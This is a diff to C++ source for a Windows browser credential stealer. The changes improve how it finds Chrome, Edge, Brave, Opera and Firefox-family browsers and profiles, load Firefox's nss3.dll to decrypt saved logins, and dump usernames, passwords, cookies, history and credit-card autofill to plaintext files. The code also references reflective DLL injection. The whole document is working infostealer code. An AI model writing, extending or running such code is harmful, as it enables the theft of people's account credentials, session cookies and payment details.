@@ -3,6 +3,7 @@
 #include <iostream>
 #include <vector>
 #include <string>
+#include <map>
 #include <algorithm>
 #include <fstream>
 #include <filesystem>
@@ -202,26 +203,50 @@ const std::vector<BrowserConfig> BROWSERS = {
     {L"Brave", L"brave.exe", L"BraveSoftware\\Brave-Browser\\User Data", {L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}, true, false, CSIDL_LOCAL_APPDATA},
     {L"Opera", L"launcher.exe", L"Opera Software\\Opera Stable", {L"C:\\Program Files\\Opera\\launcher.exe"}, false, false, CSIDL_APPDATA},
     {L"Opera GX", L"launcher.exe", L"Opera Software\\Opera GX Stable", {L"C:\\Program Files\\Opera GX\\launcher.exe"}, false, false, CSIDL_APPDATA},
-    {L"Firefox", L"firefox.exe", L"Mozilla\\Firefox", {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe"}, false, true, CSIDL_APPDATA},
-    {L"Waterfox", L"waterfox.exe", L"Waterfox", {L"C:\\Program Files\\Waterfox\\waterfox.exe"}, false, true, CSIDL_APPDATA},
-    {L"LibreWolf", L"librewolf.exe", L"LibreWolf", {L"C:\\Program Files\\LibreWolf\\librewolf.exe"}, false, true, CSIDL_APPDATA}
+    {L"Firefox", L"firefox.exe", L"Mozilla\\Firefox", {L"C:\\Program Files\\Mozilla Firefox\\firefox.exe", L"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"}, false, true, CSIDL_APPDATA},
+    {L"Waterfox", L"waterfox.exe", L"Waterfox", {L"C:\\Program Files\\Waterfox\\waterfox.exe", L"C:\\Program Files (x86)\\Waterfox\\waterfox.exe"}, false, true, CSIDL_APPDATA},
+    {L"LibreWolf", L"librewolf.exe", L"LibreWolf", {L"C:\\Program Files\\LibreWolf\\librewolf.exe", L"C:\\Program Files (x86)\\LibreWolf\\librewolf.exe"}, false, true, CSIDL_APPDATA}
 };
 
 std::wstring find_browser_exe(const std::wstring& name) {
     for (const auto& b : BROWSERS) {
         if (b.name == name) {
             for (const auto& p : b.common_paths) if (fs::exists(p)) return p;
+
+            // Registry lookup
+            std::vector<std::pair<HKEY, std::wstring>> keys = {
+                {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + b.exe_name},
+                {HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + b.exe_name},
+                {HKEY_LOCAL_MACHINE, L"SOFTWARE\\Clients\\StartMenuInternet\\" + b.name + L"\\shell\\open\\command"},
+                {HKEY_CURRENT_USER, L"SOFTWARE\\Clients\\StartMenuInternet\\" + b.name + L"\\shell\\open\\command"}
+            };
+            for (auto& k : keys) {
+                HKEY hKey;
+                if (RegOpenKeyExW(k.first, k.second.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                    wchar_t buf[MAX_PATH]; DWORD sz = sizeof(buf);
+                    if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
+                        std::wstring p = buf;
+                        if (!p.empty() && p[0] == L'\"') { p = p.substr(1); size_t end = p.find(L'\"'); if (end != std::wstring::npos) p = p.substr(0, end); }
+                        if (fs::exists(p)) { RegCloseKey(hKey); return p; }
+                    }
+                    RegCloseKey(hKey);
+                }
+            }
+
             wchar_t local[MAX_PATH]; if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) == S_OK) {
-                fs::path base = fs::path(local) / L"Programs"; fs::path target;
-                if (b.name == L"Chrome") target = base / L"Google\\Chrome\\Application\\chrome.exe";
-                else if (b.name == L"Edge") target = base / L"Microsoft\\Edge\\Application\\msedge.exe";
-                else if (b.name == L"Brave") target = base / L"BraveSoftware\\Brave-Browser\\Application\\brave.exe";
-                else if (b.name == L"Opera") target = base / L"Opera\\launcher.exe";
-                else if (b.name == L"Opera GX") target = base / L"Opera GX\\launcher.exe";
-                else if (b.name == L"Firefox") target = base / L"Mozilla Firefox\\firefox.exe";
-                else if (b.name == L"Waterfox") target = base / L"Waterfox\\waterfox.exe";
-                else if (b.name == L"LibreWolf") target = base / L"LibreWolf\\librewolf.exe";
-                if (!target.empty() && fs::exists(target)) return target.wstring();
+                std::vector<fs::path> bases = { fs::path(local) / L"Programs", L"C:\\Program Files", L"C:\\Program Files (x86)" };
+                for (auto& base : bases) {
+                    fs::path target;
+                    if (b.name == L"Chrome") target = base / L"Google\\Chrome\\Application\\chrome.exe";
+                    else if (b.name == L"Edge") target = base / L"Microsoft\\Edge\\Application\\msedge.exe";
+                    else if (b.name == L"Brave") target = base / L"BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                    else if (b.name == L"Opera") target = base / L"Opera\\launcher.exe";
+                    else if (b.name == L"Opera GX") target = base / L"Opera GX\\launcher.exe";
+                    else if (b.name == L"Firefox") target = base / L"Mozilla Firefox\\firefox.exe";
+                    else if (b.name == L"Waterfox") target = base / L"Waterfox\\waterfox.exe";
+                    else if (b.name == L"LibreWolf") target = base / L"LibreWolf\\librewolf.exe";
+                    if (!target.empty() && fs::exists(target)) return target.wstring();
+                }
             }
         }
     }
@@ -268,7 +293,7 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 std::string get_sqlite_text(sqlite3_stmt* stmt, int col) { const unsigned char* txt = sqlite3_column_text(stmt, col); return txt ? std::string((const char*)txt) : ""; }
 
 typedef enum { SECSuccess = 0, SECFailure = -1 } SECStatus;
-struct SECItem { unsigned char* data; unsigned int len; int type; };
+struct SECItem { int type; unsigned char* data; unsigned int len; };
 typedef SECStatus(*NSSInit_t)(const char*); typedef SECStatus(*NSSShutdown_t)(void); typedef SECStatus(*PK11SDRDecrypt_t)(SECItem*, SECItem*, void*);
 
 void collect_firefox(const BrowserConfig& browser) {
@@ -276,22 +301,114 @@ void collect_firefox(const BrowserConfig& browser) {
     wchar_t exe_path_buf[MAX_PATH]; GetModuleFileNameW(NULL, exe_path_buf, MAX_PATH); fs::path extractor_root = fs::path(exe_path_buf).parent_path();
     std::error_code ec; fs::path browser_dir = extractor_root / browser.name; fs::create_directories(browser_dir, ec);
 
-    wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) return;
-    fs::path data_path = fs::path(sz_path) / browser.data_path_relative; if (!fs::exists(data_path)) return;
+    wchar_t sz_path[MAX_PATH]; if (SHGetFolderPathW(NULL, browser.csidl_folder, NULL, 0, sz_path) != S_OK) {
+        std::cerr << "[-] Failed to get CSIDL folder " << browser.csidl_folder << std::endl;
+        return;
+    }
+    fs::path data_path = fs::path(sz_path) / browser.data_path_relative;
+    std::wcout << L"[*] Data Path: " << data_path.wstring() << std::endl;
+    if (!fs::exists(data_path)) {
+        std::cerr << "[-] Data path does not exist." << std::endl;
+        return;
+    }
 
     std::vector<fs::path> profile_paths; fs::path ini_path = data_path / "profiles.ini";
     if (fs::exists(ini_path)) {
-        std::ifstream file(ini_path); std::string line;
-        while (std::getline(file, line)) { if (line.find("Path=") == 0) { fs::path p = data_path / line.substr(5); if (fs::exists(p)) profile_paths.push_back(p); } }
+        std::cout << "[*] Parsing profiles.ini..." << std::endl;
+        std::ifstream file(ini_path); std::string line, section;
+        std::map<std::string, std::map<std::string, std::string>> sections;
+        while (std::getline(file, line)) {
+            if (!line.empty() && line.back() == '\r') line.pop_back();
+            if (line.empty()) continue;
+            if (line[0] == '[') {
+                size_t end = line.find(']');
+                if (end != std::string::npos) section = line.substr(1, end - 1);
+            } else {
+                size_t pos = line.find('=');
+                if (pos != std::string::npos) sections[section][line.substr(0, pos)] = line.substr(pos + 1);
+            }
+        }
+        for (auto const& [s_name, props] : sections) {
+            if (props.count("Path")) {
+                bool is_rel = (props.count("IsRelative") && props.at("IsRelative") == "1");
+                std::string p_str = props.at("Path");
+                fs::path p = is_rel ? (data_path / p_str) : fs::path(p_str);
+                if (!fs::exists(p)) p = data_path / "Profiles" / p_str;
+                if (fs::exists(p)) {
+                    bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, p)) dup = true; } catch(...) {} }
+                    if (!dup) {
+                        std::cout << "[+] Found profile path: " << p.string() << std::endl;
+                        profile_paths.push_back(p);
+                    }
+                }
+            }
+        }
     }
-    if (profile_paths.empty() && fs::exists(data_path)) { for (const auto& entry : fs::directory_iterator(data_path)) { if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) profile_paths.push_back(entry.path()); } }
 
-    std::wstring b_exe = find_browser_exe(browser.name); if (b_exe.empty()) return;
+    if (true) { // Always check for extra profiles
+        std::cout << "[*] Searching for additional profiles in direct directories..." << std::endl;
+        std::vector<fs::path> roots = { data_path, data_path / "Profiles" };
+
+        // Also check Store App virtualized path
+        wchar_t local_appdata[MAX_PATH];
+        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local_appdata) == S_OK) {
+            fs::path store_base = fs::path(local_appdata) / "Packages";
+            for (const auto& entry : fs::directory_iterator(store_base, ec)) {
+                if (entry.is_directory() && entry.path().filename().string().find("Mozilla.Firefox") != std::string::npos) {
+                    fs::path sp = entry.path() / "LocalCache" / "Roaming" / "Mozilla" / "Firefox" / "Profiles";
+                    if (fs::exists(sp)) roots.push_back(sp);
+                }
+            }
+        }
+
+        for (auto& p_root : roots) {
+            if (fs::exists(p_root)) {
+                for (const auto& entry : fs::directory_iterator(p_root, ec)) {
+                    if (entry.is_directory() && (fs::exists(entry.path() / "logins.json") || fs::exists(entry.path() / "key4.db"))) {
+                        bool dup = false; for(auto& existing : profile_paths) { try { if(fs::equivalent(existing, entry.path())) dup = true; } catch(...) {} }
+                        if (!dup) {
+                            std::cout << "[+] Found directory profile: " << entry.path().string() << std::endl;
+                            profile_paths.push_back(entry.path());
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    if (profile_paths.empty()) {
+        std::cerr << "[-] No profiles found for " << browser.name.c_str() << std::endl;
+        return;
+    }
+
+    std::wstring b_exe = find_browser_exe(browser.name);
+    if (b_exe.empty()) {
+        DWORD pid = find_main_process(browser.exe_name);
+        if (pid) {
+            HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+            if (h) {
+                wchar_t buf[MAX_PATH]; DWORD sz = MAX_PATH;
+                if (QueryFullProcessImageNameW(h, 0, buf, &sz)) b_exe = buf;
+                CloseHandle(h);
+            }
+        }
+    }
+    if (b_exe.empty()) {
+        std::cerr << "[-] Browser executable not found for " << browser.name.c_str() << std::endl;
+        return;
+    }
     fs::path bin_dir = fs::path(b_exe).parent_path();
     HMODULE h_nss = NULL; NSSInit_t f_NSS_Init = nullptr; NSSShutdown_t f_NSS_Shutdown = nullptr; PK11SDRDecrypt_t f_PK11SDR_Decrypt = nullptr;
     wchar_t saved_cwd[MAX_PATH]; GetCurrentDirectoryW(MAX_PATH, saved_cwd); SetCurrentDirectoryW(bin_dir.c_str());
     h_nss = LoadLibraryW(L"nss3.dll");
-    if (h_nss) { f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init"); f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown"); f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt"); }
+    if (h_nss) {
+        f_NSS_Init = (NSSInit_t)GetProcAddress(h_nss, "NSS_Init");
+        f_NSS_Shutdown = (NSSShutdown_t)GetProcAddress(h_nss, "NSS_Shutdown");
+        f_PK11SDR_Decrypt = (PK11SDRDecrypt_t)GetProcAddress(h_nss, "PK11SDR_Decrypt");
+        std::cout << "[+] Loaded nss3.dll from " << bin_dir.string() << std::endl;
+    } else {
+        std::cerr << "[-] Failed to load nss3.dll from " << bin_dir.string() << ". Error: " << GetLastError() << std::endl;
+    }
     SetCurrentDirectoryW(saved_cwd);
 
     wchar_t temp_base[MAX_PATH]; SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, temp_base);
@@ -303,28 +420,61 @@ void collect_firefox(const BrowserConfig& browser) {
 
         if (h_nss && f_NSS_Init && f_PK11SDR_Decrypt && f_NSS_Shutdown) {
             fs::path min_p = temp_dir / (p_name_sanit + "_nss"); fs::create_directories(min_p, ec);
+            std::cout << "[*] Copying NSS databases to " << min_p.string() << std::endl;
             copy_file_locked(p_path / "key4.db", min_p / "key4.db"); copy_file_locked(p_path / "key3.db", min_p / "key3.db"); copy_file_locked(p_path / "cert9.db", min_p / "cert9.db"); copy_file_locked(p_path / "logins.json", min_p / "logins.json");
-            SetCurrentDirectoryW(bin_dir.c_str()); std::string p_str = min_p.string(); bool inited = false;
-            if (fs::exists(min_p / "key4.db")) { if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true; }
-            if (!inited && f_NSS_Init(p_str.c_str()) == SECSuccess) inited = true;
+
+            SetCurrentDirectoryW(bin_dir.c_str());
+            std::string p_str = min_p.string();
+            // NSS prefers forward slashes on some versions, and MUST NOT have trailing slash
+            std::replace(p_str.begin(), p_str.end(), '\\', '/');
+            if (p_str.back() == '/') p_str.pop_back();
+
+            bool inited = false;
+            if (fs::exists(min_p / "key4.db")) {
+                std::cout << "[*] Attempting NSS_Init with sql:" << p_str << std::endl;
+                if (f_NSS_Init(("sql:" + p_str).c_str()) == SECSuccess) inited = true;
+                else std::cerr << "[-] NSS_Init(sql:...) failed." << std::endl;
+            }
+            if (!inited) {
+                std::cout << "[*] Attempting NSS_Init without sql prefix..." << std::endl;
+                if (f_NSS_Init(p_str.c_str()) == SECSuccess) inited = true;
+            }
+
             if (inited) {
-                fs::path login_f = min_p / "logins.json"; if (fs::exists(login_f)) {
+                std::cout << "[+] NSS Initialized successfully." << std::endl;
+                fs::path login_f = min_p / "logins.json";
+                if (fs::exists(login_f)) {
                     std::ifstream lf(login_f); json lj = json::parse(lf, nullptr, false);
                     if (!lj.is_discarded() && lj.contains("logins")) {
+                        std::cout << "[+] Found " << lj["logins"].size() << " entries in logins.json" << std::endl;
                         for (auto& login : lj["logins"]) {
                             std::string enc_u = login["encryptedUsername"], enc_p = login["encryptedPassword"], url = login["hostname"];
                             auto db_u = base64_decode(enc_u); auto db_p = base64_decode(enc_p);
-                            SECItem in_u = { db_u.data(), (unsigned int)db_u.size(), 0 }, out_u = {0}, in_p = { db_p.data(), (unsigned int)db_p.size(), 0 }, out_p = {0};
+                            SECItem in_u = { 0, db_u.data(), (unsigned int)db_u.size() }, out_u = { 0, nullptr, 0 };
+                            SECItem in_p = { 0, db_p.data(), (unsigned int)db_p.size() }, out_p = { 0, nullptr, 0 };
                             std::string u = enc_u, p = enc_p;
-                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess) u = std::string((char*)out_u.data, out_u.len);
-                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess) p = std::string((char*)out_p.data, out_p.len);
+                            if (f_PK11SDR_Decrypt(&in_u, &out_u, nullptr) == SECSuccess && out_u.data) {
+                                u = std::string((char*)out_u.data, out_u.len);
+                            } else { std::cerr << "[-] Failed to decrypt username for " << url << std::endl; }
+
+                            if (f_PK11SDR_Decrypt(&in_p, &out_p, nullptr) == SECSuccess && out_p.data) {
+                                p = std::string((char*)out_p.data, out_p.len);
+                            } else { std::cerr << "[-] Failed to decrypt password for " << url << std::endl; }
                             p_data.passwords.push_back({ url, u, p });
                         }
+                    } else {
+                        std::cerr << "[-] logins.json is empty or invalid." << std::endl;
                     }
+                } else {
+                    std::cerr << "[-] logins.json not found in temp dir." << std::endl;
                 }
                 f_NSS_Shutdown();
+            } else {
+                std::cerr << "[-] NSS_Init failed for " << p_name << std::endl;
             }
             SetCurrentDirectoryW(saved_cwd);
+        } else {
+            std::cerr << "[-] NSS functions not loaded, skipping password extraction." << std::endl;
         }
         fs::path c_db = p_path / "cookies.sqlite"; fs::path tc_db = temp_dir / (p_name_sanit + "_cook.tmp");
         if (copy_db_with_sidecars(c_db, tc_db)) {
@@ -366,7 +516,15 @@ void collect_firefox(const BrowserConfig& browser) {
                 if (aj.contains("creditCards")) for (auto& i : aj["creditCards"]) for (auto it = i.begin(); it != i.end(); ++it) if (it.value().is_string()) p_data.autofill.push_back({ it.key(), it.value() });
             }
         }
-        fs::path p_dir = browser_dir / p_name_sanit; fs::create_directories(p_dir, ec);
+        fs::path p_dir = browser_dir / p_name_sanit;
+        if (!p_data.passwords.empty() || !p_data.cookies.empty() || !p_data.history.empty() || !p_data.autofill.empty()) {
+            fs::create_directories(p_dir, ec);
+            std::cout << "[+] Saving data to " << p_dir.string() << std::endl;
+        } else {
+            std::cout << "[!] No data collected for profile " << p_name << ", skipping folder creation." << std::endl;
+            continue;
+        }
+
         try {
             std::ofstream f_pass(p_dir / "passwords.txt"); json j_pass = json::array();
             for (auto& p : p_data.passwords) { f_pass << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n"; j_pass.push_back({{"url", ensure_utf8(p.url)}, {"username", ensure_utf8(p.username)}, {"password", ensure_utf8(p.password)}}); }
